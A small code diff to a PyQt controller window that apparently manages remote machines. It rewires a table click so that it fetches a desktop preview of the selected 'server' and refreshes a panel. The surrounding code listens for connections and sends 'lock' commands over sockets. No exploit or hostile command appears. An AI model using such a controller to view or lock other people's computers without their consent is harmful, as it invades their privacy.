@@ -115,7 +115,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Triggers
         self.startListenButton.clicked.connect(self.listen_start)
         self.stopListenButton.clicked.connect(self.listen_stop)
-        self.serversTable.clicked.connect(self.update_main_menu)
+        self.serversTable.clicked.connect(self.update_preview)
 
         # Panel Triggers
         self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
@@ -369,6 +369,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if server:
             send(self.socks[server]['sock'], 'lock')
 
+    def update_preview(self):
+        self.get_desktop_preview()
+        self.emit(SIGNAL('updatePanel()'))
+
     def update_main_menu(self):
         try:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
@@ -410,6 +414,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setVisible(True)
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
+
 
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
